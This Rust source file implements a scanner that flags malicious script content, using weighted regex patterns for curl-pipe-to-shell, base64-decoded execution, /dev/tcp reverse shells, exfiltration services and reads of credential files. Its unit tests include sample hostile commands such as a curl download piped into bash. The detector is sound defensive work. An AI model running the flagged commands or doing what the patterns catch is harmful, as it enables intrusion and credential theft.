//! Heuristics for spotting malicious script content. Each match carries a
//! weight; callers turn the strongest match into a severity.

use std::sync::OnceLock;

use regex::Regex;

use super::Severity;

pub struct Hit {
    pub reason: &'static str,
    pub severity: Severity,
}

struct Pattern {
    re: Regex,
    reason: &'static str,
    severity: Severity,
}

fn patterns() -> &'static [Pattern] {
    static P: OnceLock<Vec<Pattern>> = OnceLock::new();
    P.get_or_init(|| {
        use Severity::*;
        let p = |re: &str, reason, severity| Pattern { re: Regex::new(re).unwrap(), reason, severity };
        vec![
            p(r"(?i)\b(curl|wget)\b[^\n|;]*\|\s*(sudo\s+)?(ba|z|da|k)?sh\b", "downloads a script and runs it straight away (curl | sh)", High),
            p(r"(?i)base64\s+(-d|--decode|-D)\b[^\n]*\|\s*(ba|z)?sh", "decodes hidden base64 code and runs it", High),
            p(r"(?i)\beval\s*\(\s*(atob|Buffer\.from)\s*\(", "evaluates base64-hidden JavaScript", High),
            p(r"(?i)new\s+Function\s*\(\s*(atob|Buffer\.from)", "builds code from base64-hidden text", High),
            p(r"/dev/tcp/\d", "opens a raw network connection (reverse shell pattern)", High),
            p(r"(?i)(webhook\.site|pastebin\.com/raw|transfer\.sh|api\.telegram\.org/bot|discord(app)?\.com/api/webhooks|ngrok\.io|ngrok-free\.app)", "talks to a service commonly used to exfiltrate data", High),
            p(r"(?i)\btrufflehog\b", "runs TruffleHog, a secret-hunting tool used by the Shai-Hulud worm", High),
            p(r"(?i)\bgit\s+push\b", "pushes code to a remote on its own", Medium),
            p(r"(?i)\bgit\s+(-c\s+user\.(name|email)|commit\s+[^\n]*--author)", "commits under a specific name/email", Medium),
            p(r"(?i)\bgh\s+(repo\s+create|api\s+-X\s*POST)", "creates GitHub repos or calls the GitHub API", Medium),
            p(r"(?i)(cat|readFileSync\(|open\()[^\n]{0,40}(\.npmrc|\.git-credentials|\.aws/credentials|\.ssh/id_)", "reads saved tokens or keys", High),
            p(r"(?i)\bnode\s+-e\s", "runs inline Node.js code", Medium),
            p(r"(?i)\bpython3?\s+-c\s[^\n]*(exec|base64|urllib|socket)", "runs inline Python that downloads or decodes code", Medium),
            p(r"(?i)\bnohup\b[^\n]*&\s*$", "starts a hidden background process", Low),
            p(r#"(?i)\b(node|bun|deno|python3?|ruby|perl|osascript|bash|sh|zsh)\s+["']?(\$HOME|~|/Users/[^/\s]+|/home/[^/\s]+|/tmp|/private/tmp|/Users/Shared)/\.[^\s"']+"#, "runs a script from a hidden or temporary folder", Medium),
            p(r"_0x[0-9a-f]{4,6}\b[\s\S]{0,200}_0x[0-9a-f]{4,6}\b[\s\S]{0,200}_0x[0-9a-f]{4,6}\b", "contains obfuscated JavaScript (_0x… names)", High),
            p(r#"(?i)require\(\s*['"](child_process|node:child_process)['"]\s*\)[\s\S]{0,400}(https?://|\.get\(|request\()"#, "starts programs and downloads from the internet", Medium),
        ]
    })
}

/// All reasons `text` looks suspicious, strongest first.
pub fn scan_text(text: &str) -> Vec<Hit> {
    let mut hits: Vec<Hit> = patterns()
        .iter()
        .filter(|p| p.re.is_match(text))
        .map(|p| Hit {
            reason: p.reason,
            severity: p.severity,
        })
        .collect();
    if text.lines().any(|l| l.len() > 5_000) {
        hits.push(Hit {
            reason: "has an extremely long single line (typical of hidden, minified malware)",
            severity: Severity::Medium,
        });
    }
    // Code pushed far to the right with whitespace so it's off-screen in editors.
    if text
        .lines()
        .any(|l| l.len() > 300 && l.trim_start().len() > 50 && l.contains(&" ".repeat(200)))
    {
        hits.push(Hit {
            reason: "hides code far to the right behind a wall of spaces",
            severity: Severity::High,
        });
    }
    hits.sort_by_key(|h| std::cmp::Reverse(h.severity));
    hits
}

pub fn worst(hits: &[Hit]) -> Option<Severity> {
    hits.iter().map(|h| h.severity).max()
}

/// First line matching any pattern, trimmed for display.
pub fn first_matching_line(text: &str) -> Option<(usize, String)> {
    text.lines().enumerate().find_map(|(i, l)| {
        let hit = !scan_text(l).is_empty();
        hit.then(|| (i + 1, excerpt(l)))
    })
}

pub fn excerpt(s: &str) -> String {
    let t = s.trim();
    if t.chars().count() > 200 {
        format!("{}…", t.chars().take(200).collect::<String>())
    } else {
        t.to_string()
    }
}

/// Show only the start of a secret: `ghp_abcd…`.
pub fn mask(secret: &str) -> String {
    let keep: String = secret.chars().take(8).collect();
    format!("{keep}…")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_common_bad_things() {
        assert_eq!(
            worst(&scan_text("curl -fsSL http://x.y/i | bash")),
            Some(Severity::High)
        );
        assert_eq!(worst(&scan_text("echo aGk= | base64 -d | sh")), Some(Severity::High));
        assert_eq!(worst(&scan_text("eval(atob('ZG9j'))")), Some(Severity::High));
        assert_eq!(
            worst(&scan_text("git push origin HEAD --force")),
            Some(Severity::Medium)
        );
        assert_eq!(worst(&scan_text("node ~/.cache/x/run.js")), Some(Severity::Medium));
        let padded = format!("module.exports = {{}};{}eval(x)", " ".repeat(400));
        assert_eq!(worst(&scan_text(&padded)), Some(Severity::High));
    }

    #[test]
    fn ignores_normal_config() {
        assert!(scan_text(r#"eval "$(/opt/homebrew/bin/brew shellenv)""#).is_empty());
        assert!(
            scan_text("export NVM_DIR=\"$HOME/.nvm\"\n[ -s \"$NVM_DIR/nvm.sh\" ] && \\. \"$NVM_DIR/nvm.sh\"")
                .is_empty()
        );
        assert!(scan_text("npx lint-staged").is_empty());
        assert!(scan_text("source ~/.oh-my-zsh/oh-my-zsh.sh").is_empty());
        assert!(scan_text("export GITHUB_TOKEN=abc").is_empty());
        assert!(scan_text("module.exports = { content: ['./src/**/*.tsx'] }").is_empty());
    }
}
